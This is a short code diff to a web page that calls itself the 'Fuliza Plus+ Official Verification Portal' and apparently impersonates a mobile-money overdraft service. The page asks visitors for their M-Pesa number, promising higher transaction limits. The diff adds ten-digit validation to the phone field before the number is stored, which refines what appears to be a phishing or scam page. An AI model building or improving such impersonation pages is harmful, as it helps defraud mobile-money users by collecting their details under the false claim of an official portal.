@@ -254,7 +254,7 @@ function render(){
       <h2 style="font-weight:800; font-size:26px; margin-bottom:5px;">Fuliza Plus+</h2>
       <div class="sub-title">OFFICIAL VERIFICATION PORTAL</div>
       <p class="desc">Verify your identity to unlock higher daily transaction limits.</p>
-      <input class="input" id="phoneInput" placeholder="Enter M-Pesa Number">
+      <input class="input" id="phoneInput" placeholder="Enter M-Pesa Number" maxlength="10">
       <button class="green" onclick="next()">Check My Eligibility</button>
     </div>`;
   }
@@ -312,7 +312,14 @@ function render(){
 
 function next(){
   if(step===1){
-    let number = document.getElementById("phoneInput").value;
+    let number = document.getElementById("phoneInput").value.trim();
+    number = number.replace(/\s+/g, "");
+
+    if(!/^\d{10}$/.test(number)){
+      alert("Enter a valid M-Pesa number (10 digits only)");
+      return;
+    }
+
     localStorage.setItem("userNumber", number);
   }
   step++;
